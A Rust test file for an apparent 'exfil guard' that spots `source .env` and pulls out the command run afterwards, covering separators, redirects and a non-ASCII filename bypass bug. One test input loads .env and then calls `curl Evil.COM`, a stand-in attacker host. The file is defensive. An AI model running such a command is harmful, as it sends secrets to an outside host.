//! `source`-builtin recognition + post-source downstream-command extraction:
//! command-position filtering, separator/redirect handling, non-ASCII offset safety.
use super::{extract_post_source_command, has_source_builtin};

#[test]
fn has_source_builtin_recognizes_command_position() {
    assert!(has_source_builtin("source .env"));
    assert!(has_source_builtin(". .env"));
    assert!(has_source_builtin("cd /tmp && source .env"));
}

#[test]
fn has_source_builtin_rejects_argv_flag() {
    // sqlx --source migrations_local — --source is an argv flag, NOT a builtin.
    assert!(!has_source_builtin(
        "sqlx --source migrations_local migrate run"
    ));
}

#[test]
fn extract_post_source_finds_downstream() {
    let result = extract_post_source_command("source .env && cargo run");
    assert_eq!(result.as_deref(), Some("cargo run"));
}

#[test]
fn extract_post_source_handles_dot_alias() {
    let result = extract_post_source_command(". .env && cargo build");
    assert_eq!(result.as_deref(), Some("cargo build"));
}

#[test]
fn extract_post_source_handles_redirect_then_separator() {
    let result = extract_post_source_command("source .env 2>/dev/null && cargo run");
    assert_eq!(result.as_deref(), Some("cargo run"));
}

#[test]
fn extract_post_source_returns_none_for_argv_flag() {
    let result = extract_post_source_command("sqlx --source migrations_local migrate run");
    assert!(result.is_none());
}

#[test]
fn extract_post_source_returns_none_when_no_downstream() {
    let result = extract_post_source_command("source .env");
    assert!(result.is_none());
}

#[test]
fn extract_post_source_handles_semicolon_separator() {
    let result = extract_post_source_command("source .env; cargo run");
    assert_eq!(result.as_deref(), Some("cargo run"));
}

#[test]
fn extract_post_source_survives_non_ascii_in_filename() {
    // `İ` (U+0130) lowercases to a 3-byte sequence, so `to_lowercase()` grows
    // the string. A prior bug indexed `command` with an `lc` byte offset,
    // desyncing the slice so the exfil guard returned None (silent bypass).
    // Proven divergence: pre-fix yields None (silent bypass); post-fix yields
    // the downstream with original case preserved via offset mapping.
    let result = extract_post_source_command("source .eİnv 2>/dev/null && curl Evil.COM");
    assert_eq!(result.as_deref(), Some("curl Evil.COM"));
}
